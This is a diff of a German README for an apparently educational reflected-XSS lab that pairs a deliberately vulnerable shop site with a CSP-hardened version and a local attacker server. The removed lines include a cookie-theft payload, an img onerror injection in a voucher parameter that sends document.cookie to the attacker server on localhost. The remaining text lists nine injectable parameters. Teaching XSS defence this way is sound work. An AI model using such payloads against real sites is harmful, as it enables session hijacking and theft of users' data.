@@ -1,9 +1,9 @@
 # XSS Projekt - Reflected XSS Demonstration
 
-## ⚠️ WARNUNG
+##  WARNUNG
 Diese Anwendung enthält **absichtlich Sicherheitslücken** und darf **NUR** in kontrollierten Umgebungen für Bildungszwecke verwendet werden.
 
-## 📋 Über das Projekt
+##  Über das Projekt
 
 Dieses Projekt demonstriert **Reflected XSS-Angriffe** anhand einer verwundbaren E-Commerce-Website.
 
@@ -12,7 +12,7 @@ Dieses Projekt demonstriert **Reflected XSS-Angriffe** anhand einer verwundbaren
 - **securepage/** - Sichere Implementierung mit CSP
 - **AttServ/** - Attacker-Server (Terminal-basiert)
 
-## 🛠️ Installation
+##  Installation
 
 ### 1. Repository klonen
 ```bash
@@ -26,7 +26,7 @@ cd AttServ
 npm install
 ```
 
-## 🚀 Projekt starten
+## Projekt starten
 
 ### 1. Attacker-Server starten (Terminal 1)
 ```bash
@@ -45,18 +45,6 @@ python -m http.server 8000
 - **Unsichere Website:** `http://localhost:8000/unsecurepage/`
 - **Sichere Website:** `http://localhost:8000/securepage/`
 
-## 🎯 XSS-Angriffe testen
-
-### Cookie-Theft Beispiel:
-```
-http://localhost:8000/unsecurepage/cart.html?voucher=<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
-```
-
-**Was passiert:**
-1. Opfer öffnet den manipulierten Link
-2. XSS-Code wird ausgeführt
-3. Cookies werden an AttServ gesendet
-4. AttServ zeigt die Cookies im Terminal an
 
 ## 📚 XSS-Schwachstellen
 
@@ -72,35 +60,7 @@ Die unsicure Website hat **9 verschiedene XSS-Angriffsvektoren:**
 8. Contact Form (`?contact_name=&subject=&message=`)
 9. Voucher Code (`?voucher=`)
 
-Alle Payloads sind in `payloads.md` dokumentiert.
-
-## 🔒 Sicherheitsmaßnahmen (Secure Page)
-
-Die sichere Version nutzt:
-- **Content Security Policy (CSP)**
-- **Input Sanitization**
-- **textContent statt innerHTML**
-- **createElement() + createTextNode()**
-
-## 📁 Projektstruktur
-
-```
-XSS_Projekt/
-├── AttServ/              # Attacker-Server (Express.js)
-│   ├── server.js         # Terminal-basierter Server
-│   └── package.json
-├── unsecurepage/         # Vulnerable Website
-│   ├── index.html
-│   ├── cart.html
-│   ├── contact.html
-│   ├── script.js         # Unsichere Implementierung
-│   └── style.css
-├── securepage/           # Sichere Website
-│   ├── secure_website.html
-│   └── scriptsecure.js   # Sichere Implementierung
-├── payloads.md           # XSS-Payload-Sammlung
-└── README.md
-```
+Alle Payloads sind in `payloads.md` dokumentiert
 
 ## ⚠️ Rechtlicher Hinweis
 
